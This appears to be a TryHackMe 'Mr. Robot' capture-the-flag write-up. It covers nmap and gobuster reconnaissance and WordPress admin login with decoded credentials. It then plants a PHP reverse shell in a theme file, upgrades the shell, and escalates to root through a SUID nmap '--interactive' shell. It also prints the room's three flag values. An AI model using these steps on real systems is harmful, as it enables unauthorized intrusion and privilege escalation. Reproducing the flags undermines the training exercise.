---
title: "TryHackMe - Mr. Robot CTF"
date: 2025-04-24 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [wordpress , php, mrrobot, reverse shell, gobuster, nmap, GTFOBins ]
---


## Reconnaissance and Key 1

For this [CTF challenge](https://tryhackme.com/room/mrrobot), I began enumeration against the target 10.10.251.86 using **Nmap**:

```console
──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV -T4 -p- 10.10.251.86
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 05:27 EDT
Nmap scan report for 10.10.251.86
Host is up (0.069s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache

```

Open ports discovered:

- 80/tcp – HTTP (Apache)

- 443/tcp – HTTPS 

- 22/tcp – closed

Directory enumeration with `Gobuster` revealed `WordPress`- related paths:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://10.10.251.86 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.251.86
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 235] [--> http://10.10.251.86/images/]
/blog                 (Status: 301) [Size: 233] [--> http://10.10.251.86/blog/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.251.86/feed/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.251.86/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.251.86/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.251.86/feed/]
/video                (Status: 301) [Size: 234] [--> http://10.10.251.86/video/]
/image                (Status: 301) [Size: 0] [--> http://10.10.251.86/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.251.86/feed/atom/]
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.251.86/wp-content/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.251.86/admin/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.251.86/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2664]
/css                  (Status: 301) [Size: 232] [--> http://10.10.251.86/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.251.86/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.251.86/wp-includes/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.251.86/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.251.86/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.251.86/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.251.86/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.251.86/wp-admin/]
/%20                  (Status: 301) [Size: 0] [--> http://10.10.251.86/]
/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.251.86/wp-admin/]
/0000                 (Status: 301) [Size: 0] [--> http://10.10.251.86/0000/]
/phpmyadmin           (Status: 403) [Size: 94]
/xmlrpc               (Status: 405) [Size: 42]
```

Among the discovered resources was `https://10.10.251.86/robots`, containing two files:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

I downloaded both using:

```
wget http://10.10.251.86/fsocity.dic
wget http://10.10.251.86/key-1-of-3.txt
```

Inside `key-1-of-3.txt`, I found an MD5 hash : 

`073403c8a58a1f80d943455fb30724b9`. 

## Key 2
Later, I found a suspicious Base64 string in the `http://10.10.251.86/license` :

```
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
do you want a password or something?
ZWxsaW90OkVSMjgtMDY1Mgo=
```

Decoded with [CyberChef](https://gchq.github.io/CyberChef/), it revealed credentials:

![1creds](/images/mrrobotctf/1creds.jpg)


`elliot:ER28-0652`


Logging into the WordPress admin panel via `/wp-login` was successful. The `elliot` user had administrative privileges, including the ability to edit themes and plugins. Leveraging these rights, I followed a technique described in the article [From Wordpress to Reverse Shell](https://medium.com/@akshadjoshi/from-wordpress-to-reverse-shell-3857ee1f4896). I used the [Reverse Shell Generator](https://www.revshells.com/) and selected the `PHP PentestMonkey` payload, which I then injected into the `404.php` file to gain a reverse shell.

![2revshell](/images/mrrobotctf/2revshell.jpg)


Triggering the payload by visiting the following URL:

`http://10.10.251.86/wp-content/themes/404template/404.php`

established a reverse shell. 

 In the `/home/robot/` directory, I found:

```
$ ls      
key-2-of-3.txt
password.raw-md5
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

The hash cracked using [CrackStation](https://crackstation.net) yelded

![3crack](/images/mrrobotctf/3crack.png)

 `abcdefghijklmnopqrstuvwxyz`


Once the reverse shell was established, it lacked full interactivity. To upgrade it, I ran:

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

The user was successfully switched to `robot` using the previously cracked password. Once logged in, I was able to read the second key stored in the `key-2-of-3.txt` file.

```console
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```


## Key 3

The clue for the third key was `nmap`. I proceed with the privilege escalation attempt. The first step is to search for SUID files that I can use for escalation.

`find / -perm -u=s -type f 2>/dev/null`

```console
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```
Among the results, an interesting executable appears: `/usr/local/bin/nmap`, which has the SUID bit set.


Based on the previous scan which revealed a nmap binary with the SUID bit set, I referenced [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#suid) to check for privilege escalation vectors. Following the documented method, I launched nmap in interactive mode and executed a system shell:

```
nmap --interactive
nmap> !sh
```

As a result, I gain a root shell, which allows me to access the `/root` directory and retrieve the final key stored in `key-3-of-3.txt`.

```
cd /root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
